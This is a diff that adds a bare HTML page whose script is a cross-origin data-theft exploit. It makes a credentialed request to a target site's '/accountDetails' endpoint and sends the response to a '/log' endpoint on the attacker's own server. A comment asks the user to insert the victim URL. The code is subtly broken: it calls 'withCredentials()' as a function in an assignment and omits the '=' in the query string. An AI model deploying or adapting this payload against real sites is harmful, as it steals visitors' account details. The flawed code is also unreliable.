@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        var xhr = new XMLHttpRequest();
+        var url = "https://" //before executing this one please change the request url 
+        
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == XMLHttpRequest.DONE) {
+                fetch("/log?key" + xhr.responseText)
+            }
+        }           
+        xhr.open('GET', url + "/accountDetails", true);
+        xhr.withCredentials() = true;
+        xhr.send(null);
+    </script>
+</body>
+</html>
